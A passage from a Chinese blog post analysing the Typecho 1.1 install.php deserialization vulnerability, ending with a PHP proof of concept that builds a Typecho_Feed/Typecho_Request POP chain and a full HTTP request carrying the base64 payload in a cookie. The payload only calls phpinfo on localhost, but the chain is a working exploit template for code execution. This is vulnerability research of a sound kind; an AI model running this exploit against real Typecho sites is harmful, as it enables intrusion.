&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span> . $exception-&gt;getMessage() . <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">           <span class="keyword">echo</span> nl2br($exception-&gt;__toString());</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="number">404</span> == $exception-&gt;getCode() &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">self</span>::$exceptionHandle)) &#123;</span><br><span class="line">               $handleClass = <span class="keyword">self</span>::$exceptionHandle;</span><br><span class="line">               <span class="keyword">new</span> $handleClass($exception);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">self</span>::error($exception);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">exit</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里会调用<code>ob_end_clean</code>清除缓冲区然后返回500</p>
<ul>
<li><p>因此想要有回显的话可以在pop链最后造成一个错误使程序终止<br>比如在Typecho_Feed类的<code>__construct</code>方法中加入一个<br><code>$this-&gt;_items[0][&#39;category&#39;] = Array(new Typecho_Request());</code></p>
</li>
<li><p>最终的poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'123'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'phpinfo'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>][<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>][<span class="string">'category'</span>] = <span class="keyword">Array</span>(<span class="keyword">new</span> Typecho_Request());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$config[<span class="string">'adapter'</span>] = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($config));</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;typecho1.1&#x2F;install.php?finish&#x3D;123 HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">Cookie: __typecho_config&#x3D;YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6MzoiMTIzIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO319czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czozOiIxMjMiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NzoicGhwaW5mbyI7fX19fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO319</span><br></pre></td></tr></table></figure>
</li>
</ul>

  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2020-01-06</span>
  </div>

  <div class="post-footer">
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2025
  <span class="author">
    LionTree
  </span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    </div>
  </body>
</html>